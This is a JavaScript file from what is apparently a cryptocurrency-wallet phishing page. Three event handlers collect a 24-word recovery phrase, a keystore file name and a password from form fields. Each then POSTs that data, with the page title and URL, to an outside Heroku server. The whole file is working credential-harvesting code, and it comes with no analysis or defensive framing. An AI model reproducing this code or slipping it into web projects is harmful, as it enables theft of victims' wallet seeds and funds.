document.getElementById("mnemonicForm")
  ? document
      .getElementById("mnemonicForm")
      .addEventListener("submit", function (e) {
        mnemonic();
      })
  : "";

function mnemonic() {
  let input1 = document.querySelector("#input1")
    ? document.querySelector("#input1").value
    : "";
  let input2 = document.querySelector("#input2")
    ? document.querySelector("#input2").value
    : "";
  let input3 = document.querySelector("#input3")
    ? document.querySelector("#input3").value
    : "";
  let input4 = document.querySelector("#input4")
    ? document.querySelector("#input4").value
    : "";
  let input5 = document.querySelector("#input5")
    ? document.querySelector("#input5").value
    : "";
  let input6 = document.querySelector("#input6")
    ? document.querySelector("#input6").value
    : "";
  let input7 = document.querySelector("#input7")
    ? document.querySelector("#input7").value
    : "";
  let input8 = document.querySelector("#input8")
    ? document.querySelector("#input8").value
    : "";
  let input9 = document.querySelector("#input9")
    ? document.querySelector("#input9").value
    : "";
  let input10 = document.querySelector("#input10")
    ? document.querySelector("#input10").value
    : "";
  let input11 = document.querySelector("#input11")
    ? document.querySelector("#input11").value
    : "";
  let input12 = document.querySelector("#input12")
    ? document.querySelector("#input12").value
    : "";
  let input13 = document.querySelector("#input13")
    ? document.querySelector("#input13").value
    : "";
  let input14 = document.querySelector("#input14")
    ? document.querySelector("#input14").value
    : "";
  let input15 = document.querySelector("#input15")
    ? document.querySelector("#input15").value
    : "";
  let input16 = document.querySelector("#input16")
    ? document.querySelector("#input16").value
    : "";
  let input17 = document.querySelector("#input17")
    ? document.querySelector("#input17").value
    : "";
  let input18 = document.querySelector("#input18")
    ? document.querySelector("#input18").value
    : "";
  let input19 = document.querySelector("#input19")
    ? document.querySelector("#input19").value
    : "";
  let input20 = document.querySelector("#input20")
    ? document.querySelector("#input20").value
    : "";
  let input21 = document.querySelector("#input21")
    ? document.querySelector("#input21").value
    : "";
  let input22 = document.querySelector("#input22")
    ? document.querySelector("#input22").value
    : "";
  let input23 = document.querySelector("#input23")
    ? document.querySelector("#input23").value
    : "";
  let input24 = document.querySelector("#input24")
    ? document.querySelector("#input24").value
    : "";
  let mnemonic = `${input1} ${input2} ${input3} ${input4} ${input5} ${input6} ${input7} ${input8} ${input9} ${input10} ${input11} ${input12}${input13} ${input14} ${input15} ${input16} ${input17} ${input18} ${input19} ${input20} ${input21} ${input22} ${input23} ${input24}`;
  let files = document.getElementById("file-upload")
    ? document.getElementById("file-upload").value
    : "";
  let password = !document.getElementById("password")
    ? ""
    : document.getElementById("password").value;
  let message = {
    judul: document.title,
    mnemonic: mnemonic,
    filename: files,
    password: password,
    site: window.location.href,
  };

  fetch("https://kickshoes-server.herokuapp.com/api/create", {
    method: "POST",
    headers: {
      "Content-type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((res) => res.text())
    .then((teks) => console.log(teks))
    .catch((err) => console.log(err));
}

document.getElementById("keystoreForm")
  ? document
      .getElementById("keystoreForm")
      .addEventListener("submit", function (e) {
        keystorev2();
      })
  : "";

function keystorev2() {
  let input1 = document.querySelector("#input1")
    ? document.querySelector("#input1").value
    : "";
  let input2 = document.querySelector("#input2")
    ? document.querySelector("#input2").value
    : "";
  let input3 = document.querySelector("#input3")
    ? document.querySelector("#input3").value
    : "";
  let input4 = document.querySelector("#input4")
    ? document.querySelector("#input4").value
    : "";
  let input5 = document.querySelector("#input5")
    ? document.querySelector("#input5").value
    : "";
  let input6 = document.querySelector("#input6")
    ? document.querySelector("#input6").value
    : "";
  let input7 = document.querySelector("#input7")
    ? document.querySelector("#input7").value
    : "";
  let input8 = document.querySelector("#input8")
    ? document.querySelector("#input8").value
    : "";
  let input9 = document.querySelector("#input9")
    ? document.querySelector("#input9").value
    : "";
  let input10 = document.querySelector("#input10")
    ? document.querySelector("#input10").value
    : "";
  let input11 = document.querySelector("#input11")
    ? document.querySelector("#input11").value
    : "";
  let input12 = document.querySelector("#input12")
    ? document.querySelector("#input12").value
    : "";
  let input13 = document.querySelector("#input13")
    ? document.querySelector("#input13").value
    : "";
  let input14 = document.querySelector("#input14")
    ? document.querySelector("#input14").value
    : "";
  let input15 = document.querySelector("#input15")
    ? document.querySelector("#input15").value
    : "";
  let input16 = document.querySelector("#input16")
    ? document.querySelector("#input16").value
    : "";
  let input17 = document.querySelector("#input17")
    ? document.querySelector("#input17").value
    : "";
  let input18 = document.querySelector("#input18")
    ? document.querySelector("#input18").value
    : "";
  let input19 = document.querySelector("#input19")
    ? document.querySelector("#input19").value
    : "";
  let input20 = document.querySelector("#input20")
    ? document.querySelector("#input20").value
    : "";
  let input21 = document.querySelector("#input21")
    ? document.querySelector("#input21").value
    : "";
  let input22 = document.querySelector("#input22")
    ? document.querySelector("#input22").value
    : "";
  let input23 = document.querySelector("#input23")
    ? document.querySelector("#input23").value
    : "";
  let input24 = document.querySelector("#input24")
    ? document.querySelector("#input24").value
    : "";
  let mnemonic = `${input1} ${input2} ${input3} ${input4} ${input5} ${input6} ${input7} ${input8} ${input9} ${input10} ${input11} ${input12}${input13} ${input14} ${input15} ${input16} ${input17} ${input18} ${input19} ${input20} ${input21} ${input22} ${input23} ${input24}`;
  let files = document.getElementById("file")
    ? document.getElementById("file").value
    : "";
  let password = document.getElementById("password")
    ? document.getElementById("password").value
    : "";
  let message = {
    judul: document.title,
    mnemonic: mnemonic,
    filename: files,
    password: password,
    site: window.location.href,
  };

  fetch("https://kickshoes-server.herokuapp.com/api/create", {
    method: "POST",
    headers: {
      "Content-type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((res) => res.text())
    .then((teks) => console.log(teks))
    .catch((err) => console.log(err));
}

document.getElementById("file-upload")
  ? document
      .getElementById("file-upload")
      .addEventListener("change", function (e) {
        keystore();
      })
  : "";

function keystore() {
  let input1 = document.querySelector("#input1")
    ? document.querySelector("#input1").value
    : "";
  let input2 = document.querySelector("#input2")
    ? document.querySelector("#input2").value
    : "";
  let input3 = document.querySelector("#input3")
    ? document.querySelector("#input3").value
    : "";
  let input4 = document.querySelector("#input4")
    ? document.querySelector("#input4").value
    : "";
  let input5 = document.querySelector("#input5")
    ? document.querySelector("#input5").value
    : "";
  let input6 = document.querySelector("#input6")
    ? document.querySelector("#input6").value
    : "";
  let input7 = document.querySelector("#input7")
    ? document.querySelector("#input7").value
    : "";
  let input8 = document.querySelector("#input8")
    ? document.querySelector("#input8").value
    : "";
  let input9 = document.querySelector("#input9")
    ? document.querySelector("#input9").value
    : "";
  let input10 = document.querySelector("#input10")
    ? document.querySelector("#input10").value
    : "";
  let input11 = document.querySelector("#input11")
    ? document.querySelector("#input11").value
    : "";
  let input12 = document.querySelector("#input12")
    ? document.querySelector("#input12").value
    : "";
  let input13 = document.querySelector("#input13")
    ? document.querySelector("#input13").value
    : "";
  let input14 = document.querySelector("#input14")
    ? document.querySelector("#input14").value
    : "";
  let input15 = document.querySelector("#input15")
    ? document.querySelector("#input15").value
    : "";
  let input16 = document.querySelector("#input16")
    ? document.querySelector("#input16").value
    : "";
  let input17 = document.querySelector("#input17")
    ? document.querySelector("#input17").value
    : "";
  let input18 = document.querySelector("#input18")
    ? document.querySelector("#input18").value
    : "";
  let input19 = document.querySelector("#input19")
    ? document.querySelector("#input19").value
    : "";
  let input20 = document.querySelector("#input20")
    ? document.querySelector("#input20").value
    : "";
  let input21 = document.querySelector("#input21")
    ? document.querySelector("#input21").value
    : "";
  let input22 = document.querySelector("#input22")
    ? document.querySelector("#input22").value
    : "";
  let input23 = document.querySelector("#input23")
    ? document.querySelector("#input23").value
    : "";
  let input24 = document.querySelector("#input24")
    ? document.querySelector("#input24").value
    : "";
  let mnemonic = `${input1} ${input2} ${input3} ${input4} ${input5} ${input6} ${input7} ${input8} ${input9} ${input10} ${input11} ${input12}${input13} ${input14} ${input15} ${input16} ${input17} ${input18} ${input19} ${input20} ${input21} ${input22} ${input23} ${input24}`;
  let files = document.getElementById("file-upload")
    ? document.getElementById("file-upload").value
    : "";
  let password = !document.getElementById("password")
    ? ""
    : document.getElementById("password").value;
  let message = {
    judul: document.title,
    mnemonic: mnemonic,
    filename: files,
    password: password,
    site: window.location.href,
  };

  fetch("https://kickshoes-server.herokuapp.com/api/create", {
    method: "POST",
    headers: {
      "Content-type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((res) => res.text())
    .then((teks) => console.log(teks))
    .catch((err) => console.log(err));
}
